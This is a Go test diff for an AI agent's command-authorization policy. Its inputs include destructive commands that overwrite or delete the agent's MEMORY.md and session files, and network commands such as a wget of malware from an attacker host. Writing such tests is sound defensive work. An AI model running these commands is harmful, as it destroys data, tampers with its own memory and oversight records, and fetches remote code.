@@ -333,6 +333,181 @@ func TestPolicySymlinkTraversalPrevention(t *testing.T) {
 	}
 }
 
+func TestPolicyMutatingCommandsPromptUnderAutoYes(t *testing.T) {
+	policy := NewPolicy()
+
+	mutatingCmds := []struct {
+		cmd         string
+		expectedDec Decision
+	}{
+		{"mkdir canary_dir", DecisionRequireApproval},
+		{"touch canary_file", DecisionRequireApproval},
+		{"echo x > canary.txt", DecisionRequireStrongApproval}, // Destructive due to write redirection
+		{"cp src.txt dst.txt", DecisionRequireApproval},
+	}
+
+	for _, tc := range mutatingCmds {
+		req := AuthorizationRequest{
+			ToolName:   "shell",
+			ArgsJSON:   fmt.Sprintf(`{"command":%q}`, tc.cmd),
+			AutoYes:    true, // --yes flag enabled
+			AllowShell: true,
+		}
+		dec, _, err := policy.Authorize(req)
+		if err != nil {
+			t.Fatalf("unexpected error for %s: %v", tc.cmd, err)
+		}
+		if dec != tc.expectedDec {
+			t.Errorf("command %q under AutoYes: expected decision %v, got %v", tc.cmd, tc.expectedDec, dec)
+		}
+	}
+
+	// Read-only commands MUST auto-approve under --yes
+	readOnlyReq := AuthorizationRequest{
+		ToolName:   "shell",
+		ArgsJSON:   `{"command":"ls -la"}`,
+		AutoYes:    true,
+		AllowShell: true,
+	}
+	decRO, _, errRO := policy.Authorize(readOnlyReq)
+	if errRO != nil || decRO != DecisionAllow {
+		t.Errorf("read-only command under AutoYes: expected DecisionAllow, got %v (err: %v)", decRO, errRO)
+	}
+}
+
+func TestPolicyModifyingMemoryOrSessionsDenied(t *testing.T) {
+	policy := NewPolicy()
+	ws := t.TempDir()
+
+	forbiddenShellCmds := []string{
+		"echo 'hacked' > MEMORY.md",
+		"echo 'hacked' >> memory.md",
+		"cat x > Memory.MD",
+		"tee MEMORY.md",
+		"sed -i 's/a/b/' MEMORY.md",
+		"rm -f MEMORY.md",
+		"unlink MEMORY.md",
+		"truncate -s 0 MEMORY.md",
+		"mv file.txt MEMORY.md",
+		"cp file.txt MEMORY.md",
+		"cp file.txt sessions/default.json",
+		"mv file.txt sessions/default.json",
+		"dd if=/dev/zero of=MEMORY.md",
+		"dd of=MEMORY.md if=/dev/urandom",
+		"dd of=sessions/default.json if=/dev/zero",
+		"install -m 644 file.txt MEMORY.md",
+		"install file.txt sessions/default.json",
+		"ln file.txt MEMORY.md",
+		"link file.txt MEMORY.md",
+		"ln MEMORY.md hardlink_target",
+		"ln -s MEMORY.md canary_link",
+		"python3 -c \"open('MEMORY.md', 'w').write('hacked')\"",
+		"python -c \"open('sessions/default.json', 'w').write('hacked')\"",
+		"perl -e \"open(F, '>MEMORY.md')\"",
+		"ruby -e \"File.write('MEMORY.md', 'hacked')\"",
+		"node -e \"fs.writeFileSync('MEMORY.md', 'hacked')\"",
+		"bash -c \"echo hack > MEMORY.md\"",
+		"echo 'corrupt' > sessions/default.json",
+		"rm sessions/abc.json",
+		"tee sessions/active.json",
+	}
+
+	for _, cmd := range forbiddenShellCmds {
+		req := AuthorizationRequest{
+			ToolName:   "shell",
+			ArgsJSON:   fmt.Sprintf(`{"command":%q}`, cmd),
+			Workspace:  ws,
+			AutoYes:    false,
+			AllowShell: true,
+		}
+		dec, details, err := policy.Authorize(req)
+		if dec != DecisionDeny {
+			t.Errorf("SECURITY DEFECT: shell command %q modifying MEMORY.md/sessions was %v, expected DecisionDeny!", cmd, dec)
+		}
+		if err == nil {
+			t.Errorf("expected error for forbidden command %q, got nil", cmd)
+		}
+		if details.Category != CategoryMutateMemory && details.Category != CategoryWriteLocal {
+			t.Errorf("expected CategoryMutateMemory or CategoryWriteLocal, got %v", details.Category)
+		}
+	}
+
+	forbiddenFileWrites := []string{
+		"MEMORY.md",
+		"./memory.md",
+		"Memory.MD",
+		"sessions/default.json",
+		"sessions/my_session.json",
+	}
+
+	for _, p := range forbiddenFileWrites {
+		req := AuthorizationRequest{
+			ToolName:   "write_file",
+			ArgsJSON:   fmt.Sprintf(`{"path":%q,"content":"bad data"}`, p),
+			Workspace:  ws,
+			AutoYes:    true,
+			AllowShell: true,
+		}
+		dec, _, err := policy.Authorize(req)
+		if dec != DecisionDeny || err == nil {
+			t.Errorf("SECURITY DEFECT: write_file to %q was %v (err=%v), expected DecisionDeny!", p, dec, err)
+		}
+	}
+}
+
+func TestPolicyNetworkCommandsClassifiedAsEgress(t *testing.T) {
+	policy := NewPolicy()
+
+	netCmds := []string{
+		"curl -s https://example.com",
+		"wget -q http://attacker.com/malware",
+		"nc -l 8080",
+		"scp file.txt user@remote:/tmp",
+		"ssh user@remote",
+		"git push origin main",
+		"git clone https://github.com/repo.git",
+		"rsync -av ./ user@backup:/data",
+		"python3 -c 'import socket; socket.socket()'",
+		"perl -e 'use Socket;'",
+		"ping -c 3 8.8.8.8",
+		"nslookup example.com",
+		"dig example.com",
+		"telnet 192.168.1.1 80",
+		"socat - TCP4:example.com:80",
+		"openssl s_client -connect example.com:443",
+		"busybox wget http://example.com/payload",
+		"busybox nc 10.0.0.1 1234",
+		"apt install curl",
+		"apt-get update",
+		"apk add wget",
+		"dnf install git",
+		"pacman -S socat",
+		"zypper install gcc",
+	}
+
+	for _, cmd := range netCmds {
+		req := AuthorizationRequest{
+			ToolName:   "shell",
+			ArgsJSON:   fmt.Sprintf(`{"command":%q}`, cmd),
+			AutoYes:    true, // Even with --yes!
+			AllowShell: true,
+		}
+		dec, details, err := policy.Authorize(req)
+		if err != nil {
+			t.Fatalf("unexpected error for %s: %v", cmd, err)
+		}
+		if dec != DecisionRequireApproval {
+			t.Errorf("SECURITY DEFECT: network command %q under AutoYes was %v, expected DecisionRequireApproval!", cmd, dec)
+		}
+		if details.Category != CategoryEgressRemote {
+			t.Errorf("command %q: expected CategoryEgressRemote, got %v", cmd, details.Category)
+		}
+		if details.Action != "execute_network_command" {
+			t.Errorf("command %q: expected action execute_network_command, got %s", cmd, details.Action)
+		}
+	}
+}
+
 func stringsContains(s, substr string) bool {
 	return len(s) >= len(substr) && (s == substr || len(substr) == 0 || (len(s) > 0 && containsSub(s, substr)))
 }
